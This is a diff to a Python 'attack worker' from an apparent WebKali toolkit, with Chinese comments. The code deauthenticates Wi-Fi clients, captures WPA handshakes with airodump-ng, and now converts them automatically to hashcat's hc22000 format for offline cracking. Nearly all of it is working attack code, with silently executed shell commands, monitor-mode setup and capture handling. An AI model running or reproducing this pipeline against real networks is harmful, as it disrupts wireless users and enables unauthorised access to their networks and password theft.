@@ -4,16 +4,22 @@ import time
 import os
 import sys
 import glob
+import shutil
 
 
 # ==========================================
-# WebKali 攻击执行单元 (Attack Worker) v5.5
-# 职责: 执行 Deauth 攻击、捕获握手包
+# WebKali 攻击执行单元 (Attack Worker) v5.7
+# 职责: 执行 Deauth 攻击、捕获握手包、自动格式转换
 # ==========================================
 
 def run_cmd(cmd):
     """静默执行命令"""
     subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+def check_tool_installed(tool_name):
+    """检查工具是否安装"""
+    return shutil.which(tool_name) is not None
 
 
 def setup_monitor(interface, channel):
@@ -54,7 +60,7 @@ def attack_deauth(bssid, interface, duration):
 
 
 def capture_handshake(bssid, interface, channel, duration):
-    """握手包捕获流程"""
+    """握手包捕获流程 & 自动转换"""
     print(f"[*] Capture started: {bssid} (CH {channel})")
 
     # 清理冲突
@@ -62,6 +68,7 @@ def capture_handshake(bssid, interface, channel, duration):
     setup_monitor(interface, channel)
 
     prefix = f"/tmp/handshake_{bssid.replace(':', '')}"
+    # 清理旧文件
     for f in glob.glob(f"{prefix}*"): os.remove(f)
 
     # 1. 启动录制
@@ -82,13 +89,26 @@ def capture_handshake(bssid, interface, channel, duration):
     dump_proc.terminate()
     run_cmd("killall airodump-ng")
 
-    # 3. 结果检查
+    # 3. 结果检查 & 格式转换
     cap = f"{prefix}-01.cap"
     if not os.path.exists(cap): cap = f"{prefix}-01.pcap"
 
     if os.path.exists(cap) and os.path.getsize(cap) > 1000:
         print(f"[SUCCESS] File generated: {cap}")
         print("CAPTURED_HS_POTENTIAL")
+
+        # === 新增：自动转换为 hc22000 ===
+        if check_tool_installed("hcxpcapngtool"):
+            hc_file = f"{prefix}.hc22000"
+            print(f"[*] Converting to Hashcat format: {hc_file}")
+            # hcxpcapngtool -o output.hc22000 input.cap
+            run_cmd(f"hcxpcapngtool -o {hc_file} {cap}")
+
+            if os.path.exists(hc_file):
+                print(f"[SUCCESS] Hash file generated: {hc_file}")
+        else:
+            print("[WARN] hcxtools not installed, skipping conversion.")
+
     else:
         print("[FAIL] Capture failed or file empty")
 
